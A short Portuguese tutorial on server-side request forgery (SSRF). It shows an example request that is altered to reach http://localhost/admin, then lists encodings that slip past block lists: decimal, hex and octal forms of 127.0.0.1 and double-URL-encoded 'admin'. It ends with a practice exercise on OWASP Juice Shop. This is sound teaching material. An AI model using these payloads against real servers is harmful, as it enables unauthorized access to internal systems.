SSRF é uma vulnerabilidade que permite forçar o servidor a fazer uma requisição.
Isso acontece quando uma aplicação possui uma funcionalidade para importar dados de uma URL, podendo permitir ao atacante alterar a URL em que será feita a requisição e acessar dados sensíveis que não deveriam ser acessados.
Por exemplo, veja a seguinte requisição:

	POST /product/stock HTTP/1.0
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 118

	stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1

Perceba que ela está buscando dados de uma API via URL. Isso configura como uma vulnerabilidade de SSRF, pois o atacante pode modificá-la para acessar dados sensíveis, como:

	POST /product/stock HTTP/1.0
	Content-Type: application/x-www-form-urlencoded
	Content-Length: 118

	stockApi=http://localhost/admin

Dessa forma, é feita uma requisição para um endereço local da máquina, causando um bypass no access control.

Em alguns casos, é possível haver filtros que impedem certos hosts e palavras, como "localhost", "127.0.0.1", "admin", entre outros. Uma possível solução é a ofuscação de strings, como nos exemplos a seguir:
	127.0.0.1 -> 127.1
	127.0.0.1 -> 2130706433 (decimal)
	127.0.0.1 -> 0x7f000001 (hexadecimal)
	127.0.0.1 -> 0177.0.0.1 (octal)
	admin -> %2561dmin
	admin -> %2561%2564%256d%2569%256e (duplo encode)
	admin -> ad%6din

Exemplo prático:
	No Juice Shop, na aba de foto de perfil, é possível forçar a página a fazer download de um link específico
	O link é carregado e inserido em um caminho. Descubra-o
	Tente acessar dados dentro do localhost.
